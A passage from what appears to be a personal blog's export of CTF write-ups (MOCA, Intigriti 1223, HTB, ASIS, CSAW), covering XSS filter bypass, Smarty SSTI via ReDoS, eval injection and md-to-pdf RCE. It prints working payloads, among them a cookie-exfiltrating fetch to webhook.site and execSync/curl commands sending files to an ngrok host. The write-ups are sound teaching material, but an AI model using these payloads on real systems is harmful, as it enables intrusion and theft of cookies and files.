ASCII tab or newline from inputs.\n2.2) doesn\u0026rsquo;t starts with \u0026ldquo;j\u0026rdquo; bypass # This one was tougher. the strip function that was allowing me to bypass the previous check was sending me crazy on this one. Majority of payloads broke the javascript protocol: even if they bypassed the checks, they would just get included as part of the web application URL (e.g url=/java%0Ascript:payload). Another example is what I initially thought to be a NULL byte bypass, which caused instead a strange behaviour:\nAs you can see, it bypassed the python checks but in the button preview (left corner) it was mutated in some non printable character, invalidating it as protocol. However, i felt in being in the right path, until the previous blog confirmed my sensations.\nControl Characters are allowed?? It did, in fact.\nUsing the BACKSPACE (%08) character allowed me to bypass the python filter and still getting a valid url for the javascript protocol! And any of the ASCII Control Characters below would have probably get the job done.\n2.3) regex bypass # This was probably the easiest check to bypass, since javascript is very permissive in expressions that can be created even with a few symbols, it is no coincidence that there are many esoteric languages ‚Äã‚Äãon javascript such as JSFuck that manage to create valid expressions using only a few symbols.\nFun Fact\nhere I\u0026rsquo;ve found some of the funniest javascript esoteric shit expression while doing this challenge. Like\u0026hellip;how the fuck i can popup alert with fucking Egyptian hieroglyphs, but a simple NULL byte will break the shit out of the payload?? However, searching brainlessly \u0026ldquo;XSS payloads without parentheses\u0026rdquo; was enough since i found many working payloads inside this repo. I was also able to double encode inside the payload after the javascript: since javascript was decoding it.\n2.4) PoC # %08java%0Ascript%3Afetch%2528\u0026#39;https://webhook.site/xxxx\u0026#39;%2Bdocument.cookie%2529 // javascript:fetch(\u0026#39;https://webhook.site/xxxx\u0026#39;+document.cookie) Flag: PWNX{WH0_D035'N7_l0V3_4_g00D_0l'_W4F?}\n","date":"20 July 2024","externalUrl":null,"permalink":"/posts/moca-ctf-quals-2024/raas/","section":"Blog","summary":"Writeup for RaaS client-side web challenge of MOCA CTF Quals 2024","title":"MOCA CTF 2024 Quals - RaaS","type":"posts"},{"content":"","date":"20 July 2024","externalUrl":null,"permalink":"/tags/url-spec/","section":"Tags","summary":"","title":"URL Spec","type":"tags"},{"content":"","date":"20 July 2024","externalUrl":null,"permalink":"/tags/xss/","section":"Tags","summary":"","title":"XSS","type":"tags"},{"content":"Welcome to my personal blog!\n","date":"10 January 2024","externalUrl":null,"permalink":"/posts/","section":"Blog","summary":"","title":"Blog","type":"posts"},{"content":" Intigriti Monthly Challenge 1223 # Update:\nThis writeup was selected as the winner of the Intigriti December Challenge (1223) and was awarded a prize of 50‚Ç¨ on Intigriti swags \u0026ndash;\u0026gt; https://x.com/intigriti/status/1737861726517784601 .\nAt the moment of writing, this writeup it\u0026rsquo;s also part of the HackTricks wiki on the \u0026ldquo;PHP Tricks\u0026rdquo; section \u0026ndash;\u0026gt; https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#redos-bypass\nTL;DR # The challenge involved achieving RCE through SSTI on PHP\u0026rsquo;s Smarty template engine. This was accomplished by bypassing a filtering regex through backtracking, exceeding PHP\u0026rsquo;s default pcre.backtrack_limit, ultimately leading to a Segmentation Fault. According to the preg_match() documentation, the function returns false on failure, which will successfully bypass the restrictions. 0. Challenge description # The solution\u0026hellip;\nShould retrieve the flag from the web server. The flag format is INTIGRITI{.*}. Should NOT use another challenge on the intigriti.io domain. 1. Enumeration # 1.1) Challenge scenario # challenge first look Let\u0026rsquo;s go! Another Intigriti Challenge, time to get some coffe and win swa\u0026hellip;oh\u0026hellip;PHP\u0026hellip;regex\u0026hellip;\n1.2) Technologies # One of the first things we look at are technologies; insidious CVEs and known bugs could give us an easy win.\nUnfortunately, not this time, since Wappalyzer tell us that PHP version is 7.4.33, which is the latest for the PHP 7.x branch. However, it\u0026rsquo;s still PHP 7 and not 8, something to keep in mind.\nAs a second note of interest, the author of the challenge was kind enough to also give us the version used by Smarty - a well known template engine for PHP - which turns out to be 4.3.4. Once again, this version is the latest release of the project without known security bugs.\n1.3) Source code analysis # As mentioned previously, we are kindly provided with the source code of the challenge, so let\u0026rsquo;s take a look:\nif(isset($_GET[\u0026#39;source\u0026#39;])){ highlight_file(__FILE__); die(); } require(\u0026#39;/var/www/vendor/smarty/smarty/libs/Smarty.class.php\u0026#39;); $smarty = new Smarty(); $smarty-\u0026gt;setTemplateDir(\u0026#39;/tmp/smarty/templates\u0026#39;); $smarty-\u0026gt;setCompileDir(\u0026#39;/tmp/smarty/templates_c\u0026#39;); $smarty-\u0026gt;setCacheDir(\u0026#39;/tmp/smarty/cache\u0026#39;); $smarty-\u0026gt;setConfigDir(\u0026#39;/tmp/smarty/configs\u0026#39;); $pattern = \u0026#39;/(\\b)(on\\S+)(\\s*)=|javascript|\u0026lt;(|\\/|[^\\/\u0026gt;][^\u0026gt;]+|\\/[^\u0026gt;][^\u0026gt;]+)\u0026gt;|({+.*}+)/s\u0026#39;; if(!isset($_POST[\u0026#39;data\u0026#39;])){ $smarty-\u0026gt;assign(\u0026#39;pattern\u0026#39;, $pattern); $smarty-\u0026gt;display(\u0026#39;index.tpl\u0026#39;); exit(); } // returns true if data is malicious function check_data($data){ global $pattern; return preg_match($pattern,$data); } if(check_data($_POST[\u0026#39;data\u0026#39;])){ $smarty-\u0026gt;assign(\u0026#39;pattern\u0026#39;, $pattern); $smarty-\u0026gt;assign(\u0026#39;error\u0026#39;, \u0026#39;Malicious Inputs Detected\u0026#39;); $smarty-\u0026gt;display(\u0026#39;index.tpl\u0026#39;); exit(); } $tmpfname = tempnam(\u0026#34;/tmp/smarty/templates\u0026#34;, \u0026#34;FOO\u0026#34;); $handle = fopen($tmpfname, \u0026#34;w\u0026#34;); fwrite($handle, $_POST[\u0026#39;data\u0026#39;]); fclose($handle); $just_file = end(explode(\u0026#39;/\u0026#39;,$tmpfname)); $smarty-\u0026gt;display($just_file); unlink($tmpfname); What\u0026rsquo;s happening here?\nFirst of all, if we don\u0026rsquo;t provide the data parameter to the POST request, it simply render the same page again.\nif(!isset($_POST[\u0026#39;data\u0026#39;])){ $smarty-\u0026gt;assign(\u0026#39;pattern\u0026#39;, $pattern); $smarty-\u0026gt;display(\u0026#39;index.tpl\u0026#39;); exit(); } Then, our input $_POST['data'] undergoes a check by a regular expression in the check_data() function that use the preg_match() function of the PHP PCRE library.\nfunction check_data($data){ global $pattern; return preg_match($pattern,$data); } If the regex identifies a match, the server responds with \u0026ldquo;Malicious input detected\u0026rdquo; (AKA you won\u0026rsquo;t get the flag :P).\nif(check_data($_POST[\u0026#39;data\u0026#39;])){ $smarty-\u0026gt;assign(\u0026#39;pattern\u0026#39;, $pattern); $smarty-\u0026gt;assign(\u0026#39;error\u0026#39;, \u0026#39;Malicious Inputs Detected\u0026#39;); $smarty-\u0026gt;display(\u0026#39;index.tpl\u0026#39;); exit(); } Otherwise, our input is written into a temporary file (with a randomly generated name)\n$tmpfname = tempnam(\u0026#34;/tmp/smarty/templates\u0026#34;, \u0026#34;FOO\u0026#34;); $handle = fopen($tmpfname, \u0026#34;w\u0026#34;); fwrite($handle, $_POST[\u0026#39;data\u0026#39;]); fclose($handle); and this file is passed to the Smarty display() function. This function essentially processes the template and outputs it.\n$just_file = end(explode(\u0026#39;/\u0026#39;,$tmpfname)); $smarty-\u0026gt;display($just_file); unlink($tmpfname); Thus, our objective is probably to exploit SSTI, Server-Side Template Injection: a vulnerability that arises when an arbitrary user input with the native template syntax (like the example below), is fed into the template engine (Smarty in our case) and gets executed server-side.\n{system(\u0026#39;ls\u0026#39;)} // the ls command gets executed! It\u0026rsquo;s evident that if we manage to evade the regex and allow curly brackets to be included in the temporary file, we achieve Remote Command Execution (RCE).\n1.4) Regex breakdown # Now let\u0026rsquo;s take a look at the regex in detail.\n/(\\b)(on\\S+)(\\s*)=|javascript|\u0026lt;(|\\/|[^\\/\u0026gt;][^\u0026gt;]+|\\/[^\u0026gt;][^\u0026gt;]+)\u0026gt;|({+.*}+)/s Attribute Event Handlers:\n(\\b)(on\\S+)(\\s*)=: This part is designed to identify potential event handlers in HTML attributes that start with \u0026ldquo;on\u0026rdquo; (e.g., onclick, onmouseover). (\\b): Word boundary to ensure that \u0026ldquo;on\u0026rdquo; is the beginning of a word. (on\\S+): Matches \u0026ldquo;on\u0026rdquo; followed by one or more non-whitespace characters. (\\s*): Matches any whitespace characters following the event handler. =: Looks for the equal sign indicating the start of an attribute value. Javascript String:\njavascript: This part simply looks for the string \u0026ldquo;javascript,\u0026rdquo; which could indicate an attempt to execute JavaScript code. HTML Tags:\n\u0026lt;(|\\/|[^\\/\u0026gt;][^\u0026gt;]+|\\/[^\u0026gt;][^\u0026gt;]+)\u0026gt;: This section attempts to match HTML tags. \u0026lt;: Matches the opening bracket of an HTML tag. (|\\/|[^\\/\u0026gt;][^\u0026gt;]+|\\/[^\u0026gt;][^\u0026gt;]+): This part is more complex: \\/: Matches a forward slash, possibly indicating a self-closing tag.\nOR (|) [^\\/\u0026gt;][^\u0026gt;]+: Matches characters that are not a forward slash or a closing bracket, ensuring that the tag has some content.\nOR (|) \\/[^\u0026gt;][^\u0026gt;]+: Matches a forward slash followed by characters, ensuring the tag has some content. \u0026gt;: Matches the closing bracket of an HTML tag. Curly Braces Content:\n({+.*}+): This part attempts to match content enclosed in curly braces. Breaking it down: {+: Matches one or more opening curly braces. .*: Matches any characters (zero or more). }+: Matches one or more closing curly braces. 2. Exploitation # I was searching far and wide for an attack vector, staring at the regex on regex101 trying to find some flaws where I could throw my { } to get SSTI\u0026hellip;\nUntil I realized that I probably shouldn\u0026rsquo;t focus on the regex ITSELF but more on the context in which it was used.\nKnowing the beautiful pearls of wisdom that PHP gifts us, I started looking for the usual evasion techniques:\nType Juggling Null Byte Injection (something that would have worked back in 2008 lol) or even leaving \u0026lt;?php tag open and letting the server fix it (taking inspiration from mutation XSS). However, none of these approaches were allowing me to win. Actually, for the last idea, it would only work if the application saved our files with the .php extension and not just a random name as a result of tempnam().\nIndeed, observe how the same file with an unclosed PHP tag inside will be interpreted differently by the server with the extension as the only difference:\nRendering of file with \u0026lt;?php tag open WITHOUT .php extension VS WITH .php extension But that was not the case.\nAnyway, I began looking into various documentations, starting with the Smarty documentation and then referring to the PHP documentation for information about the various functions used in the code. Usually, you can find warnings about how specific functions should be implemented, and, in fact, reading the PHP documentation of preg_match(), I came across this one:\npreg_match() Documentation warning\u0026hellip;PHP\u0026hellip;why???? Ummmmhh, can this be useful to us somehow?\nCertainly! Take another look at the code where preg_match() is involved:\n// returns true if data is malicious function check_data($data){ global $pattern; return preg_match($pattern,$data); } Yea, the comments says it returns true if the pattern matches our input, but in reality, it returns 1 if it matches, 0 if it does not match, and it returns false if the regex fails!\nThen the return value is used as condition in a if statement without strict type checks! (classic PHP oversights)\nif(check_data($_POST[\u0026#39;data\u0026#39;])){ [...] // we are bad people exit(); } Let\u0026rsquo;s quickly test in the PHP console what happens when the return value of the check_data() function is 1, 0 or false:\nWe may have found the path.\n2.1) filter bypass via ReDoS that causes SIGSEGV in PCRE # Now the question is:\nHow can we cause the preg_match() to fail?\nLuckily for me, lately I had to deal with challenges where a \u0026ldquo;ReDoS\u0026rdquo; made a Race Condition possible, I have also recently started a project where I had to deal a lot with regexes and therefore I also had to fight with the regex backtracking nightmare.\nSo I know how to make a regex do bad things. And knowing what a \u0026ldquo;ReDoS\u0026rdquo; is, helped me to find what i was searching for.\nHowever, in the context of this challenge I still didn\u0026rsquo;t know what the conditions were for causing unexpected behaviors. I just knew I had somehow to blow things up.\nSo, I thought Google might have something exotic to offer me. Searching for \u0026ldquo;php preg_match ReDoS\u0026rdquo; or \u0026ldquo;php regex failure,\u0026rdquo; you can find some interesting articles:\nOWASP ReDoS The Explosive Quantifier Trap Regexploit: DoS-able Regular Expressions Bad Meets evil - PHP meets Regular Expressions PHP regular expression functions causing segmentation fault Everything lead to one path, specially the latest two blogs.\nIn short the problem happens because the preg_* functions in PHP builds upon the PCRE library. In PCRE certain regular expressions are matched by using a lot of recursive calls, which uses up a lot of stack space. It is possible to set a limit on the amount of recursions allowed, but in PHP this limit defaults to 100.000 which is more than fits in the stack.\nThis Stackoverflow thread was also linked in the post where it is talked more in depth about this issue. Our task was now clear:\nSend an input that would make the regex do 100_000+ recursions, causing SIGSEGV, making the preg_match() function return false thus making the application think that our input is not malicious, throwing the surprise at the end of the payload something like {system(\u0026lt;verybadcommand\u0026gt;)} to get SSTI \u0026ndash;\u0026gt; RCE \u0026ndash;\u0026gt; flag :).\nI had two options to get there:\nSend a load of shit and pray. Reflect on which points the regex was backtracking the most and give calculated weight to those weak points. Since I didn\u0026rsquo;t want to destroy the challenge\u0026rsquo;s infrastructure, I opted for the latter.\nFirst of all, we need to put pressure on the Explosive Quantifier * that we can find in the first part of the regex:\n(\\b)(on\\S+)(\\s*)= Let\u0026rsquo;s start by matching the word boundary (\\b) , meaning that the matching group that comes after will be captured as a whole word.\nThen we need to match the \u0026ldquo;on\u0026rdquo; and we\u0026rsquo;re ready to give our Christmas gift of \u0026ldquo;X\u0026rdquo; characters to the quantifier explosive \u0026ldquo;*\u0026rdquo;, which will match all the \u0026ldquo;X\u0026rdquo; characters, moving the pointer forward by n positions where n is the number of our \u0026ldquo;X\u0026rdquo; characters.\nThis is the opposite of what would have happened with the \u0026ldquo;greedy\u0026rdquo; quantifier ( *?), which would have halved the number of iterations. It seems complicated, so let\u0026rsquo;s go and visualize it on regex101 using the debugger.\nOk, let\u0026rsquo;s craft something evil now.\nWe need at least 100k iterations. Easy. Let\u0026rsquo;s fill the payload with 'X'*100_000\u0026hellip; buuut it\u0026rsquo;s not working.\nWhy?\nWell, in regex terms, we\u0026rsquo;re not actually doing 100k \u0026ldquo;recursions\u0026rdquo;, but instead we\u0026rsquo;re counting \u0026ldquo;backtracking steps\u0026rdquo;, which as the PHP documentation states it defaults to 1_000_000 (1M) in the pcre.backtrack_limit variable.\nTo reach that, 'X'*500_001 will result in 1 million backtracking steps (500k forward and 500k backwards).\nLet\u0026rsquo;s try.\npayload = f\u0026#34;@dimariasimone on{\u0026#39;X\u0026#39;*500_001} {{system(\u0026#39;id\u0026#39;)}}\u0026#34; Profit!\n2.2) PoC # import requests URL = \u0026#39;https://challenge-1223.intigriti.io/challenge.php\u0026#39; data={\u0026#39;data\u0026#39;:f\u0026#34;@dimariasimone on{\u0026#39;X\u0026#39;*500_001} {{system(\u0026#39;cat /flag.txt\u0026#39;)}}\u0026#34;} #print(data) r = requests.post(URL, data=data) print(r.text.split(\u0026#39; \u0026#39;)[-1]) Flag: INTIGRITI{7h3_fl46_l457_71m3_w45_50_1r0n1c!}\n3. Mitigation # To mitigate the issue, we have some work to do.\nA solution could be to avoid using PHP altogether, but I understand that some people may be fond of it :/\nHere are some mitigation steps:\nUnder PHP, this maximum recursion depth is specified with the pcre.recursion_limit configuration variable and (unfortunately) the default value is set to 100,000. This value is TOO BIG! Here is a table of safe values of pcre.recursion_limit for a variety of executable stack sizes: Stacksize pcre.recursion_limit 64 MB 134217 32 MB 67108 16 MB 33554 8 MB 16777 4 MB 8388 2 MB 4194 1 MB 2097 512 KB 1048 256 KB 524 Since preg_match() returns false on failure and 1 and 0 respectively if the match was successful and if not, we should do some strict type checking. NOTE: this is just a quick fix in the challenge context, generally speaking using the preg_last_error() function and defining behaviours for each case is a better solution.\nUse regex timeouts: Set a maximum execution time or timeout for regex pattern matching. Use alternatives to regular expressions, such as string manipulation functions or parsing libraries. My job here is done ","date":"20 December 2023","externalUrl":null,"permalink":"/posts/intigriti-challenges/1223/","section":"Blog","summary":"Writeup for Intigriti December Challenge (1223)","title":"Intigriti Monthly Challenge 1223","type":"posts"},{"content":"","date":"20 December 2023","externalUrl":null,"permalink":"/tags/pcre-preg_match/","section":"Tags","summary":"","title":"PCRE Preg_match","type":"tags"},{"content":"","date":"20 December 2023","externalUrl":null,"permalink":"/tags/php/","section":"Tags","summary":"","title":"PHP","type":"tags"},{"content":"","date":"20 December 2023","externalUrl":null,"permalink":"/tags/rce/","section":"Tags","summary":"","title":"RCE","type":"tags"},{"content":"","date":"20 December 2023","externalUrl":null,"permalink":"/tags/redos/","section":"Tags","summary":"","title":"ReDoS","type":"tags"},{"content":"","date":"20 December 2023","externalUrl":null,"permalink":"/tags/smarty/","section":"Tags","summary":"","title":"Smarty","type":"tags"},{"content":"","date":"20 December 2023","externalUrl":null,"permalink":"/tags/ssti/","section":"Tags","summary":"","title":"SSTI","type":"tags"},{"content":" HTB University CTF 2023 - WindowsOfOpportunity # TL;DR # The challenge consisted of reversing a window-sliding algorithm knowing a known byte and/or bruteforcing it. Challenge description # You\u0026rsquo;ve located a zombie hideout and are trying to peek inside. Suddenly, a window opens a crack and a zombie peers out - they want a password\u0026hellip;\nChallenge scenario # We\u0026rsquo;re given an executable, decompiling it with Ghidra will result in the following:\nint main(void) { char local_38 [43]; char local_d; uint local_c; puts(\u0026#34;A voice comes from the window... \\\u0026#39;Password?\\\u0026#39;\u0026#34;); fgets(local_38,0x2a,stdin); local_c = 0; while( true ) { if (0x24 \u0026lt; local_c) { puts(\u0026#34;The window opens to allow you passage...\u0026#34;); return 0; } local_d = local_38[(int)(local_c + 1)] + local_38[(int)local_c]; if (local_d != arr[(int)local_c]) break; local_c = local_c + 1; } puts(\u0026#34;The window slams shut...\u0026#34;); return -1; } The code is quite simple and short, it appears to be a simple window-sliding algorithm to check the password (i.e. the flag).\nMeaning that, for each index of our input, it\u0026rsquo;ll take the corresponding byte and the following one, sum them, and if their sum corresponds to the corresponding index value saved in the global variable arr the execution continues. Until eventually \u0026ldquo;The window opens to allow you passage\u0026hellip;\u0026rdquo; (i.e we\u0026rsquo;ve discovered the flag).\nThe code it\u0026rsquo;s already clear enough to be able to reproduce a reversing algorithm, but for readability sake here\u0026rsquo;s a refactored version:\nint main(void) { char input [43]; char sum; int n; puts(\u0026#34;A voice comes from the window... \\\u0026#39;Password?\\\u0026#39;\u0026#34;); fgets(input,42,stdin); n = 0; while( true ) { if (36 \u0026lt; n) { puts(\u0026#34;The window opens to allow you passage...\u0026#34;); return 0; } sum = input[n + 1] + input[n]; if (sum != arr[n]) break; n = n + 1; } puts(\u0026#34;The window slams shut...\u0026#34;); return -1; } This is instead the global variable arr:\n00104060 9c [0] 00104061 96 [1] 00104062 bd [2] 00104063 af [3] 00104064 93 [4] 00104065 c3 [5] 00104066 94 [6] 00104067 60 [7] 00104068 a2 [8] 00104069 d1 [9] 0010406a c2 [10] 0010406b cf [11] 0010406c 9c [12] 0010406d a3 [13] 0010406e a6 [14] 0010406f 68 [15] 00104070 94 [16] 00104071 c1 [17] 00104072 d7 [18] 00104073 ac [19] 00104074 96 [20] 00104075 93 [21] 00104076 93 [22] 00104077 d6 [23] 00104078 a8 [24] 00104079 9f [25] 0010407a d2 [26] 0010407b 94 [27] 0010407c a7 [28] 0010407d d6 [29] 0010407e 8f [30] 0010407f a0 [31] 00104080 a3 [32] 00104081 a1 [33] 00104082 a3 [34] 00104083 56 [35] 00104084 9e [36] Solution # We have therefore understood that to solve the challenge we must find the correct bytes which, added together, will give a certain value.\nBut how do we know which is the exact pair of bytes that will give us the flag piece by piece?\nThinking about it, the combination of interest is very easy to bruteforce, but it is even easier if we knew even just one byte of the \u0026ldquo;secret\u0026rdquo; to discover, given that to obtain the subsequent ones it will be enough to do a simple subtraction!\nWhy?\nLet\u0026rsquo;s visualize the algorithm:\nAt the first iteration, the first two bytes (b1 and b2) are taken into consideration, their sum (sum0) should be equal to arr[0] which is 0x9c (156).\nAt the second iteration, the second byte (again) and the third byte (b1 and b2) are taken in consideration, their sum (sum1) should be equal to arr[1] which is 0x96 (150).\nTherefore, knowing sum0 from arr[0], and assuming that we also know b0 then b1 is simply the value of sum0-b0. Thus obtaining b1, the value of b2 is simply sum1-b1 and so on.\nAaand, we know b0! Since the flag starts with HTB{, therefore b0 == H == 0x48 == 72. Let\u0026rsquo;s write a simple reversing script in python:\n#!/usr/bin/env python arr = [0x9c, 0x96, 0xbd, 0xaf, 0x93, 0xc3, 0x94, 0x60, 0xa2, 0xd1, 0xc2, 0xcf, 0x9c, 0xa3, 0xa6, 0x68, 0x94, 0xc1, 0xd7, 0xac, 0x96, 0x93, 0x93, 0xd6, 0xa8, 0x9f, 0xd2, 0x94, 0xa7, 0xd6, 0x8f, 0xa0, 0xa3, 0xa1, 0xa3, 0x56, 0x9e] flag = [ord(\u0026#39;H\u0026#39;)] for i, sum in enumerate(arr): flag.append(sum-flag[i]) for c in flag: print(chr(c),end=\u0026#39;\u0026#39;) ‚îî‚îÄ$ python exploit.py HTB{4_d00r_cl0s35_bu7_4_w1nd0w_0p3n5!} Flag: HTB{4_d00r_cl0s35_bu7_4_w1nd0w_0p3n5!}\n","date":"26 October 2023","externalUrl":null,"permalink":"/posts/htb-university-ctf-2023/windowsofopportunity/","section":"Blog","summary":"Writeup for WindowsOfOpportunity reversing challenge of HackTheBox University CTF 2023.","title":"HackTheBox University CTF 2023 - WindowsOfOpportunity","type":"posts"},{"content":"","date":"26 October 2023","externalUrl":null,"permalink":"/categories/rev/","section":"Categories","summary":"","title":"Rev","type":"categories"},{"content":"","date":"26 October 2023","externalUrl":null,"permalink":"/tags/window-sliding/","section":"Tags","summary":"","title":"Window-Sliding","type":"tags"},{"content":" Beginner ducks # Description: Hiiiii, welcome to ASIS CTF. We have ducks. Check them out http://ducks.asisctf.com:8000/. Download source-code from here.\nSource code:\n#!/usr/bin/env python3 from flask import Flask,request,Response import random import re app = Flask(__name__) availableDucks = [\u0026#39;duckInABag\u0026#39;,\u0026#39;duckLookingAtAHacker\u0026#39;,\u0026#39;duckWithAFreeHugsSign\u0026#39;] indexTemplate = None flag = None @app.route(\u0026#39;/duck\u0026#39;) def retDuck(): what = request.args.get(\u0026#39;what\u0026#39;) duckInABag = \u0026#39;./images/e146727ce27b9ed172e70d85b2da4736.jpeg\u0026#39; duckLookingAtAHacker = \u0026#39;./images/591233537c16718427dc3c23429de172.jpeg\u0026#39; duckWithAFreeHugsSign = \u0026#39;./images/25058ec9ffd96a8bcd4fcb28ef4ca72b.jpeg\u0026#39; if(not what or re.search(r\u0026#39;[^A-Za-z\\.]\u0026#39;,what)): return \u0026#39;what?\u0026#39; with open(eval(what),\u0026#39;rb\u0026#39;) as f: return Response(f.read(), mimetype=\u0026#39;image/jpeg\u0026#39;) @app.route(\u0026#34;/\u0026#34;) def index(): return indexTemplate.replace(\u0026#39;WHAT\u0026#39;,random.choice(availableDucks)) with open(\u0026#39;./index.html\u0026#39;) as f: indexTemplate = f.read() with open(\u0026#39;/flag.txt\u0026#39;) as f: flag = f.read() if(__name__ == \u0026#39;__main__\u0026#39;): app.run(port=8000) Our sink here is eval(), since it\u0026rsquo;ll execute the python code that we pass to the ?what parameter and return the result in the response. We can verify the vulnerability by running the code locally and passing to it the variable duckInABag, which evaluates to: './images/e146727ce27b9ed172e70d85b2da4736.jpeg', so code will be:\nwith open(\u0026#39;./images/e146727ce27b9ed172e70d85b2da4736.jpeg\u0026#39;,\u0026#39;rb\u0026#39;) as f: return Response(f.read(), mimetype=\u0026#39;image/jpeg\u0026#39;) and therefore show us the image.\nThere\u0026rsquo;s some input filtering with the regex: [^A-Za-z\\.]; it will only accept letters and the dot symbol. So how can we read /flag.txt if / isn\u0026rsquo;t allowed?\nWe can try to read the file descriptor properties. i.e: f.buffer.name will evaluate to: /flag.txt.\n$ curl http://ducks.asisctf.com:8000/duck?what=f.buffer.name ASIS{run-away-ducks-are-coming-ü¶Üü¶Ü} Flag: ASIS{run-away-ducks-are-coming-ü¶Üü¶Ü}\n","date":"15 October 2022","externalUrl":null,"permalink":"/posts/asis-quals-2022/beginner-ducks/","section":"Blog","summary":"Writeup for Beginner ducks reversing challenge of ASIS CTF Quals 2022.","title":"ASIS CTF Quals 2022 - Beginner ducks","type":"posts"},{"content":"","date":"15 October 2022","externalUrl":null,"permalink":"/tags/flask/","section":"Tags","summary":"","title":"Flask","type":"tags"},{"content":"","date":"15 October 2022","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":" DockREleakage # Description # A breach occurred and some files have been leaked. One of the leaked files named dockREleakage.tar.gz contains an image of one of the company\u0026rsquo;s components. An anonymous hacker has reached out to me and beware me that there is some serious mistake in my build image process. The hacker implies that sensitive information should be handled carefully. However, I couldn\u0026rsquo;t find the mistake by myself. Please help me!\nSolution # The challenge provides you dockREleakage.tar.gz, so pretty straight forward:\ntar xvf dockREleakage.tar --directory dockREleakage\ncd into folder and you\u0026rsquo;ll find different layers of a docker image. In the first json you\u0026rsquo;ll find the history of docker commands and in particular these two are useful for us:\n{ \u0026#34;created\u0026#34;: \u0026#34;2022-09-03T07:46:12.680399343Z\u0026#34;, \u0026#34;created_by\u0026#34;: \u0026#34;/bin/sh -c echo \\\u0026#34;ZmxhZ3tuM3Yzcl9sMzR2M181M241MTcxdjNfMW5mMHJtNDcxMG5fdW5wcjA=\\\u0026#34; \\u003e /dev/null\u0026#34;, \u0026#34;empty_layer\u0026#34;: true }, { \u0026#34;created\u0026#34;: \u0026#34;2022-09-03T07:46:13.319972067Z\u0026#34;, \u0026#34;created_by\u0026#34;: \u0026#34;/bin/sh -c cat p-flag.txt \\u003e tmp.txt; rm -rf flag.txt p-flag.txt; mv tmp.txt flag.txt; echo \\\u0026#34;\\\u0026#34; \\u003e\\u003e flag.txt\u0026#34; }, First command == first part of the flag, that is clearly a base64 encoded string:\n$ echo \u0026#34;ZmxhZ3tuM3Yzcl9sMzR2M181M241MTcxdjNfMW5mMHJtNDcxMG5fdW5wcjA=\u0026#34; | base64 -d flag{n3v3r_l34v3_53n5171v3_1nf0rm4710n_unpr0 Second command == second part of the flag, unsuccessful attempts to hide the flag as you can find them in the various layers inside the layer.tar\n$ cd 928ab519cd995aeae5eced3dbe4b7e86c8bc7f7662ef0f73e59c2f30b2b3b8e4 $ tree layer \u0026amp;\u0026amp; cat layer/chal/flag.txt layer ‚îî‚îÄ‚îÄ chal ‚îî‚îÄ‚îÄ flag.txt 73c73d_w17h1n_7h3_d0ck3rf1l3} Find the rest of the flag by yourself! Check out also this nice tool to explore docker image layers: https://github.com/wagoodman/dive Flag: flag{n3v3r_l34v3_53n5171v3_1nf0rm4710n_unpr073c73d_w17h1n_7h3_d0ck3rf1l3}\n","date":"14 September 2022","externalUrl":null,"permalink":"/posts/csaw-ctf-2022/dockreleakage/","section":"Blog","summary":"Writeup for DockREleakage reversing challenge of CSAW CTF 2022.","title":"CSAW CTF 2022 - DockREleakage","type":"posts"},{"content":" My Little Website # Description: I am new to programming and made this simple pdf creater website here, hopefully it is secure enough :) \u0026hellip; http://web.chal.csaw.io:5013\nThe challenge comes as a server-side PDF rendering website, and we can write markdown.\nFirst thing, let\u0026rsquo;s check for XSS:\n\u0026lt;script\u0026gt; document.write(window.location) \u0026lt;/script\u0026gt; And we find out that it\u0026rsquo;s vulnerable to Server-Side XSS, as we\u0026rsquo;re not injecting code in the webpage (client-side), instead we executing code on the server-side of the application.\nLet\u0026rsquo;s try something more interesting:\n\u0026lt;script\u0026gt;document.write(\u0026#39;\u0026lt;iframe src=\u0026#34;/\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;)\u0026lt;/script\u0026gt; We\u0026rsquo;re inside the /chal directory. We also understand that it\u0026rsquo;s a Node.js application, and index.js seems definitely something interesting for us, let\u0026rsquo;s try to read it:\n\u0026lt;script\u0026gt; fetch(\u0026#39;index.js\u0026#39;) .then(response =\u0026gt; response.text()) .then(text =\u0026gt; document.write(text)) \u0026lt;/script\u0026gt; That\u0026rsquo;s a lot of info, but what\u0026rsquo;s most important is the mdToPdf package. With a quick search we\u0026rsquo;ll know that the version used by the application is vulnerable to CVE-2021-23639 and we can achieve RCE: https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880.\n---js require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;ls -la \u0026gt; /tmp/ls.txt \u0026amp;\u0026amp; curl -d @/tmp/ls.txt http://06f6-151-62-28-161.eu.ngrok.io\u0026#39;) --- No flag here, let\u0026rsquo;s try to look one directory above:\n---js require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;ls -la .. \u0026gt; /tmp/ls.txt \u0026amp;\u0026amp; curl -d @/tmp/ls.txt http://06f6-151-62-28-161.eu.ngrok.io\u0026#39;) --- Here we go, read flag.txt:\n---js require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;curl -d @../flag.txt http://06f6-151-62-28-161.eu.ngrok.io\u0026#39;) --- Flag: CTF{pdf_c0nt1nu3s_70_5uCK}\n","date":"14 September 2022","externalUrl":null,"permalink":"/posts/csaw-ctf-2022/my-little-website/","section":"Blog","summary":"Writeup for My Little Website web challenge of CSAW CTF 2022.","title":"CSAW CTF 2022 - My Little Website","type":"posts"},{"content":"","date":"14 September 2022","externalUrl":null,"permalink":"/posts/csaw-ctf-2022/","section":"Blog","summary":"","title":"CSAW CTF 2022 writeups","type":"posts"},{"content":"","date":"14 September 2022","externalUrl":null,"permalink":"/tags/docker-layers/","section":"Tags","summary":"","title":"Docker Layers","type":"tags"},{"content":"","date":"14 September 2022","externalUrl":null,"permalink":"/categories/misc/","section":"Categories","summary":"","title":"Misc","type":"categories"},{"content":"","date":"14 September 2022","externalUrl":null,"permalink":"/tags/node.js/","section":"Tags","summary":"","title":"Node.js","type":"tags"},{"content":"","date":"8 September 2022","externalUrl":null,"permalink":"/tags/express.js/","section":"Tags","summary":"","title":"Express.js","type":"tags"},{"content":"","date":"8 September 2022","externalUrl":null,"permalink":"/tags/request-smuggling/","section":"Tags","summary":"","title":"Request Smuggling","type":"tags"},{"content":" TeamItaly CTF 2023 - Flag Proxy # Description: I just added authentication to my flag service (server-back) using a proxy (server-front), but a friend said it\u0026rsquo;s useless\u0026hellip;\nSite: http://flag-proxy.challs.teamitaly.eu\nAuthor: @Giotino\nThe 